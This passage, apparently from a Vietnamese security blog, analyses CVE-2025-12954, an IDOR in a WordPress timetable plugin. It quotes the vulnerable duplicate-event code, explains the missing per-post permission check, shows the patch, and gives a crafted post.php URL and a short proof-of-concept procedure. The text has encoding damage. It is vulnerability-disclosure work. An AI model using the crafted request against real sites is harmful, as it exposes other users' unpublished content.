1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;post_action_mptt_duplicate_event&amp;#39;, array( $this-&amp;gt;get( &amp;#39;events&amp;#39; ), &amp;#39;post_action_mptt_duplicate_event&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong &lt;strong&gt;WordPress&lt;/strong&gt;, c√°c hook c√≥ ti·ªÅn t·ªë &lt;code&gt;post_action_&lt;/code&gt; l√† hook ƒë·∫∑c bi·ªát d√πng ƒë·ªÉ x·ª≠ l√Ω nh·ªØng h√†nh ƒë·ªông ƒë∆∞·ª£c truy·ªÅn qua tham s·ªë &lt;code&gt;action&lt;/code&gt; khi truy c·∫≠p file &lt;code&gt;post.php&lt;/code&gt;.&#xA;C·ª• th·ªÉ, khi ng∆∞·ªùi d√πng truy c·∫≠p v√†o URL d·∫°ng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/wp-admin/post.php?post=post_id&amp;amp;action=mptt_duplicate_event&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;WordPress s·∫Ω g·ªçi ƒë·∫øn callback &lt;code&gt;post_action_mptt_duplicate_event&lt;/code&gt; ƒë·ªÉ x·ª≠ l√Ω logic &lt;strong&gt;duplicate event&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;B√™n c·∫°nh vi·ªác ƒëƒÉng k√Ω action hook, plugin c√≤n &lt;strong&gt;ch·ªß ƒë·ªông t·∫°o URL k√≠ch ho·∫°t action&lt;/strong&gt; n√†y th√¥ng qua vi·ªác th√™m m·ªôt li√™n k·∫øt ‚ÄúDuplicate‚Äù v√†o danh s√°ch h√†nh ƒë·ªông c·ªßa m·ªói b√†i vi·∫øt trong trang qu·∫£n tr·ªã.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function post_row_actions( $actions, $post ) {&#xA;    if ( $post-&amp;gt;post_type == $this-&amp;gt;post_type &amp;amp;&amp;amp; current_user_can(&amp;#39;edit_posts&amp;#39;) ) {&#xA;&#xA;        $action_url = add_query_arg(&#xA;            array(&#xA;                &amp;#39;post&amp;#39; =&amp;gt; $post-&amp;gt;ID,&#xA;                &amp;#39;action&amp;#39; =&amp;gt; &amp;#39;mptt_duplicate_event&amp;#39;,&#xA;                &amp;#39;_wpnonce&amp;#39; =&amp;gt; wp_create_nonce( &amp;#39;mptt_duplicate_event&amp;#39; )&#xA;            ),&#xA;            admin_url( &amp;#39;post.php&amp;#39; )&#xA;        );&#xA;&#xA;        $actions[&amp;#39;duplicate&amp;#39;] = &amp;#39;&amp;lt;a href=&amp;#34;&amp;#39; . $action_url . &amp;#39;&amp;#34; aria-label=&amp;#34;&amp;#39; .&#xA;            __(&amp;#39;Duplicate&amp;#39;, &amp;#39;mp-timetable&amp;#39;) . &amp;#39;&amp;#34; rel=&amp;#34;permalink&amp;#34;&amp;gt;&amp;#39; . __(&amp;#39;Duplicate&amp;#39;, &amp;#39;mp-timetable&amp;#39;) . &amp;#39;&amp;lt;/a&amp;gt;&amp;#39;;&#xA;    }&#xA;&#xA;    return $actions;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m n√†y d√πng hook &lt;code&gt;post_row_actions&lt;/code&gt; ƒë·ªÉ &lt;strong&gt;th√™m link Duplicate&lt;/strong&gt; v√†o danh s√°ch action c·ªßa m·ªói b√†i vi·∫øt trong admin.&lt;/p&gt;&#xA;&lt;p&gt;Link ch·ªâ hi·ªÉn th·ªã khi b√†i vi·∫øt ƒë√∫ng &lt;code&gt;post_type&lt;/code&gt; v√† ng∆∞·ªùi d√πng c√≥ quy·ªÅn &lt;code&gt;edit_posts&lt;/code&gt; (Contributor+).&#xA;URL ƒë∆∞·ª£c t·∫°o tr·ªè ƒë·∫øn &lt;code&gt;post.php&lt;/code&gt; k√®m &lt;code&gt;post&lt;/code&gt; (ID b√†i vi·∫øt), &lt;code&gt;action&lt;/code&gt; (&lt;code&gt;mptt_duplicate_event&lt;/code&gt;) v√† &lt;code&gt;_wpnonce&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Khi ng∆∞·ªùi d√πng click &lt;strong&gt;Duplicate&lt;/strong&gt;, WordPress s·∫Ω k√≠ch ho·∫°t hook &lt;code&gt;post_action_mptt_duplicate_event&lt;/code&gt; ƒë·ªÉ x·ª≠ l√Ω vi·ªác nh√¢n b·∫£n b√†i vi·∫øt.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-21-cve-2025-12954/duplicate.png&#34; title=&#34;Link duplicate trong m·ªói Event&#34; data-thumbnail=&#34;/posts/2025-12-21-cve-2025-12954/duplicate.png&#34; data-sub-html=&#34;&lt;h2&gt;Duplicate&lt;/h2&gt;&lt;p&gt;Link duplicate trong m·ªói Event&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-21-cve-2025-12954/duplicate.png&#39; alt=&#34;Duplicate&#34; height=&#34;483&#34; width=&#34;875&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Link duplicate trong m·ªói Event&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Callback &lt;code&gt;post_action_mptt_duplicate_event&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function post_action_mptt_duplicate_event( $post_id ) {&#xA;    global $wpdb;&#xA;&#xA;    $post_type = &amp;#39;&amp;#39;;&#xA;&#xA;    if ( $post_id ) {&#xA;        $post = get_post( $post_id );&#xA;    }&#xA;&#xA;    if ( $post ) {&#xA;        $post_type = $post-&amp;gt;post_type;&#xA;    }&#xA;&#xA;    if ( $post_type !== $this-&amp;gt;post_type ) {&#xA;        wp_die( __( &amp;#39;A post type mismatch has been detected.&amp;#39;, &amp;#39;mp-timetable&amp;#39; ), __( &amp;#39;Sorry, you are not allowed to edit this item.&amp;#39;, &amp;#39;mp-timetable&amp;#39; ), 400 );&#xA;    }&#xA;&#xA;    $nonce = sanitize_key( $_REQUEST[&amp;#39;_wpnonce&amp;#39;] );&#xA;&#xA;    if ( wp_verify_nonce( $nonce, &amp;#39;mptt_duplicate_event&amp;#39; ) &amp;amp;&amp;amp; current_user_can(&amp;#39;edit_posts&amp;#39;) ) {&#xA;&#xA;        $current_user = wp_get_current_user();&#xA;        $new_post_author = $current_user-&amp;gt;ID;&#xA;&#xA;        /*&#xA;            * new post data array&#xA;            */&#xA;        $args = array(&#xA;            &amp;#39;comment_status&amp;#39; =&amp;gt; $post-&amp;gt;comment_status,&#xA;            &amp;#39;ping_status&amp;#39;    =&amp;gt; $post-&amp;gt;ping_status,&#xA;            &amp;#39;post_author&amp;#39;    =&amp;gt; $new_post_author,&#xA;            &amp;#39;post_content&amp;#39;   =&amp;gt; $post-&amp;gt;post_content,&#xA;            &amp;#39;post_excerpt&amp;#39;   =&amp;gt; $post-&amp;gt;post_excerpt,&#xA;            &amp;#39;post_name&amp;#39;      =&amp;gt; $post-&amp;gt;post_name,&#xA;            &amp;#39;post_parent&amp;#39;    =&amp;gt; $post-&amp;gt;post_parent,&#xA;            &amp;#39;post_password&amp;#39;  =&amp;gt; $post-&amp;gt;post_password,&#xA;            &amp;#39;post_status&amp;#39;    =&amp;gt; &amp;#39;draft&amp;#39;,&#xA;            // translators: New post title of the duplicated post&#xA;            &amp;#39;post_title&amp;#39;     =&amp;gt; sprintf( __(&amp;#39;%s - Copy&amp;#39;, &amp;#39;mp-timetable&amp;#39;), $post-&amp;gt;post_title ),&#xA;            &amp;#39;post_type&amp;#39;      =&amp;gt; $post-&amp;gt;post_type,&#xA;            &amp;#39;to_ping&amp;#39;        =&amp;gt; $post-&amp;gt;to_ping,&#xA;            &amp;#39;menu_order&amp;#39;     =&amp;gt; $post-&amp;gt;menu_order&#xA;        );&#xA;&#xA;        /*&#xA;            * insert the post by wp_insert_post() function&#xA;            */&#xA;        $new_post_id = wp_insert_post( $args );&#xA;&#xA;        if( is_wp_error($new_post_id) ) {&#xA;            wp_die( $post_id-&amp;gt;get_error_message() );&#xA;        }&#xA;&#xA;        /*&#xA;            * get all current post terms and set them to the new post draft&#xA;            */&#xA;        $taxonomies = get_object_taxonomies($post-&amp;gt;post_type);&#xA;        foreach ($taxonomies as $taxonomy) {&#xA;            $post_terms = wp_get_object_terms($post_id, $taxonomy, array(&amp;#39;fields&amp;#39; =&amp;gt; &amp;#39;slugs&amp;#39;));&#xA;            wp_set_object_terms($new_post_id, $post_terms, $taxonomy, false);&#xA;        }&#xA;&#xA;        /*&#xA;            * duplicate all post meta&#xA;            */&#xA;        $post_meta_keys = \get_post_custom_keys( $post_id );&#xA;&#xA;        if ( ! empty( $post_meta_keys ) ) {&#xA;&#xA;            $meta_excludelist = [&#xA;                &amp;#39;_edit_lock&amp;#39;,&#xA;                &amp;#39;_edit_last&amp;#39;,&#xA;                &amp;#39;_wp_old_slug&amp;#39;&#xA;            ];&#xA;&#xA;            $meta_keys = \array_diff( $post_meta_keys, $meta_excludelist );&#xA;&#xA;            foreach ( $meta_keys as $meta_key ) {&#xA;                $meta_values = \get_post_custom_values( $meta_key, $post_id );&#xA;&#xA;                // Clear existing meta data&#xA;                \delete_post_meta( $new_post_id, $meta_key );&#xA;&#xA;                foreach ( $meta_values as $meta_value ) {&#xA;                    $meta_value = \maybe_unserialize( $meta_value );&#xA;                    \add_post_meta( $new_post_id, $meta_key, addslashes( $meta_value ) );&#xA;                }&#xA;            }&#xA;&#xA;        }&#xA;&#xA;        /*&#xA;            * duplicate timeslots in custom BD&#xA;            */&#xA;        $timeslots = $this-&amp;gt;wpdb-&amp;gt;get_results( &#xA;            $this-&amp;gt;wpdb-&amp;gt;prepare(&amp;#34;SELECT * FROM {$this-&amp;gt;table_name} WHERE event_id = %d&amp;#34;, $post_id ), &#xA;        OBJECT );&#xA;&#xA;        if ( !empty($timeslots) ) {&#xA;&#xA;            foreach ( $timeslots as $timeslot ) {&#xA;                $wpdb-&amp;gt;insert(&#xA;                    $this-&amp;gt;table_name,&#xA;                    array(&#xA;                        &amp;#39;column_id&amp;#39;   =&amp;gt; $timeslot-&amp;gt;column_id,&#xA;                        &amp;#39;event_id&amp;#39;    =&amp;gt; $new_post_id,&#xA;                        &amp;#39;event_start&amp;#39; =&amp;gt; date( &amp;#39;H:i&amp;#39;, strtotime( $timeslot-&amp;gt;event_start ) ),&#xA;                        &amp;#39;event_end&amp;#39;   =&amp;gt; date( &amp;#39;H:i&amp;#39;, strtotime( $timeslot-&amp;gt;event_end ) ),&#xA;                        &amp;#39;user_id&amp;#39;     =&amp;gt; $timeslot-&amp;gt;user_id,&#xA;                        &amp;#39;description&amp;#39; =&amp;gt; $timeslot-&amp;gt;description&#xA;                    )&#xA;                );&#xA;            }&#xA;        }&#xA;&#xA;        /*&#xA;            * redirect to the edit post screen for the new draft&#xA;            */&#xA;        wp_safe_redirect( get_edit_post_link( $new_post_id, &amp;#39;&amp;#39; ) );&#xA;        exit();&#xA;&#xA;    } else {&#xA;        wp_die( __( &amp;#39;Sorry, you are not allowed to edit this item.&amp;#39; ) );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m n√†y th·ª±c hi·ªán duplicate c·ªßa post c√≥ post id l√† &lt;code&gt;$post_id&lt;/code&gt;, tuy nhi√™n:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( wp_verify_nonce( $nonce, &amp;#39;mptt_duplicate_event&amp;#39; ) &amp;amp;&amp;amp; current_user_can(&amp;#39;edit_posts&amp;#39;) ) {&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒê√¢y l√† nguy√™n nh√¢n ch√≠nh d·∫´n t·ªõi IDOR (Insecure Direct Object Reference).&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;edit_posts&lt;/code&gt; l√† quy·ªÅn &lt;strong&gt;chung&lt;/strong&gt;, kh√¥ng g·∫Øn v·ªõi &lt;strong&gt;b√†i vi·∫øt c·ª• th·ªÉ&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Contributor tr·ªü l√™n ƒë·ªÅu c√≥ quy·ªÅn n√†y&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Kh√¥ng c√≥ ki·ªÉm tra:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;b√†i vi·∫øt c√≥ thu·ªôc user hi·ªán t·∫°i kh√¥ng&lt;/li&gt;&#xA;&lt;li&gt;user c√≥ quy·ªÅn ch·ªânh s·ª≠a &lt;strong&gt;post_id c·ª• th·ªÉ&lt;/strong&gt; hay kh√¥ng&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;$post = get_post( $post_id );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B√†i vi·∫øt ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ &lt;code&gt;$post_id&lt;/code&gt; truy·ªÅn qua URL m√† &lt;strong&gt;kh√¥ng r√†ng bu·ªôc quy·ªÅn s·ªü h·ªØu&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;post.php?action=mptt_duplicate_event&amp;amp;post=123&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ch·ªâ c·∫ßn ƒëo√°n ho·∫∑c thay ƒë·ªïi &lt;code&gt;post&lt;/code&gt; ID trong URL, ng∆∞·ªùi d√πng c√≥ &lt;code&gt;edit_posts&lt;/code&gt; v·∫´n c√≥ th·ªÉ:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;duplicate b√†i vi·∫øt c·ªßa ng∆∞·ªùi kh√°c&lt;/li&gt;&#xA;&lt;li&gt;duplicate b√†i ƒë√£ publish&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;V√¨ WordPress &lt;strong&gt;kh√¥ng t·ª± ki·ªÉm tra quy·ªÅn ·ªü hook &lt;code&gt;post_action_*&lt;/code&gt;&lt;/strong&gt;, to√†n b·ªô vi·ªác ki·ªÉm so√°t truy c·∫≠p ph·ª• thu·ªôc v√†o ƒëo·∫°n &lt;code&gt;current_user_can()&lt;/code&gt; trong plugin.&lt;/p&gt;&#xA;&lt;p&gt;Thay v√¨ s·ª≠ d·ª•ng &lt;code&gt;edit_posts&lt;/code&gt;, b·∫£n v√° ƒë√£ chuy·ªÉn sang ki·ªÉm tra quy·ªÅn tr√™n t·ª´ng ƒë·ªëi t∆∞·ª£ng c·ª• th·ªÉ b·∫±ng meta capability:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;current_user_can( &amp;#39;edit_post&amp;#39;, $post_id )&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;C√°ch ki·ªÉm tra n√†y bu·ªôc WordPress ph·∫£i x√°c minh:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Ng∆∞·ªùi d√πng c√≥ quy·ªÅn ch·ªânh s·ª≠a b√†i vi·∫øt ƒë∆∞·ª£c tham chi·∫øu b·ªüi &lt;code&gt;$post_id&lt;/code&gt; hay kh√¥ng&lt;/li&gt;&#xA;&lt;li&gt;B√†i vi·∫øt c√≥ thu·ªôc v·ªÅ ng∆∞·ªùi d√πng hi·ªán t·∫°i kh√¥ng&lt;/li&gt;&#xA;&lt;li&gt;Tr·∫°ng th√°i b√†i vi·∫øt (draft, pending, published, private)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Nh·ªù ƒë√≥, ng∆∞·ªùi d√πng kh√¥ng c√≤n c√≥ th·ªÉ t·ª± √Ω thay ƒë·ªïi post ID trong URL ƒë·ªÉ duplicate b√†i vi·∫øt c·ªßa ng∆∞·ªùi kh√°c, v√† l·ªó h·ªïng &lt;strong&gt;IDOR&lt;/strong&gt; ƒë∆∞·ª£c kh·∫Øc ph·ª•c.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-21-cve-2025-12954/diff.png&#34; title=&#34;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&#34; data-thumbnail=&#34;/posts/2025-12-21-cve-2025-12954/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-21-cve-2025-12954/diff.png&#39; alt=&#34;Diff&#34; height=&#34;679&#34; width=&#34;1788&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;&#xA;A[&amp;#34;Authenticated user (Contributor&amp;#43;)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Click Duplicate link or craft URL manually&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;Request: /wp-admin/post.php?action=mptt_duplicate_event&amp;amp;post={target_post_id}&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;WordPress loads post.php&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;do_action(&amp;#39;post_action_mptt_duplicate_event&amp;#39;, post_id)&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;post_action_mptt_duplicate_event(post_id)&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;get_post(post_id) without ownership check&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Check nonce &amp;#43; current_user_can(&amp;#39;edit_posts&amp;#39;)&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;Permission granted (generic capability)&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;Duplicate target post (content, meta, taxonomy, custom table)&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;Create new draft owned by attacker&amp;#34;]&#xA;K --&amp;gt; L[&amp;#34;Redirect to edit screen of duplicated post&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Login b·∫±ng Contributor account&lt;/li&gt;&#xA;&lt;li&gt;Truy c·∫≠p &lt;code&gt;Timetable&lt;/code&gt; &amp;gt; &lt;code&gt;Events&lt;/code&gt; v√† click &lt;code&gt;Duplicate&lt;/code&gt; c·ªßa event b·∫•t k·ª≥&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-21-cve-2025-12954/poc.gif&#34; title=&#34;PoC&#34; data-thumbnail=&#34;/posts/2025-12-21-cve-2025-12954/poc.gif&#34; data-sub-html=&#34;&lt;h2&gt;PoC&lt;/h2&gt;&lt;p&gt;PoC&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-21-cve-2025-12954/poc.gif&#39; alt=&#34;PoC&#34; height=&#34;644&#34; width=&#34;1916&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;PoC&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng xu·∫•t ph√°t t·ª´ vi·ªác plugin ch·ªâ ki·ªÉm tra quy·ªÅn t·ªïng qu√°t &lt;code&gt;edit_posts&lt;/code&gt; khi duplicate event, thay v√¨ ki·ªÉm tra quy·ªÅn tr√™n &lt;strong&gt;b√†i vi·∫øt c·ª• th·ªÉ&lt;/strong&gt;. Do hook &lt;code&gt;post_action_*&lt;/code&gt; kh√¥ng ƒë∆∞·ª£c WordPress t·ª± ƒë·ªông b·∫£o v·ªá, ng∆∞·ªùi d√πng c√≥ quy·ªÅn th·∫•p (Contributor) c√≥ th·ªÉ thay ƒë·ªïi &lt;code&gt;post&lt;/code&gt; ID trong URL ƒë·ªÉ duplicate event m√† h·ªç kh√¥ng s·ªü h·ªØu, d·∫´n t·ªõi IDOR. B·∫£n v√° kh·∫Øc ph·ª•c b·∫±ng c√°ch s·ª≠ d·ª•ng meta capability &lt;code&gt;edit_post&lt;/code&gt;, bu·ªôc WordPress x√°c minh quy·ªÅn tr√™n t·ª´ng post.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;edit_posts&lt;/code&gt; kh√¥ng ph√π h·ª£p ƒë·ªÉ b·∫£o v·ªá thao t√°c tr√™n post c·ª• th·ªÉ&lt;/li&gt;&#xA;&lt;li&gt;Nonce kh√¥ng thay th·∫ø cho ki·ªÉm tra quy·ªÅn&lt;/li&gt;&#xA;&lt;li&gt;ID l·∫•y t·ª´ request lu√¥n l√† user-controlled&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n d√πng &lt;code&gt;current_user_can( &#39;edit_post&#39;, $post_id )&lt;/code&gt; khi thao t√°c tr√™n post&lt;/li&gt;&#xA;&lt;li&gt;Hook &lt;code&gt;post_action_*&lt;/code&gt; y√™u c·∫ßu plugin t·ª± ki·ªÉm so√°t authorization&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/mp-timetable/vulnerability/wordpress-timetable-and-event-schedule-plugin-2-4-16-contributor-event-disclosure-via-idor-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Timetable and Event 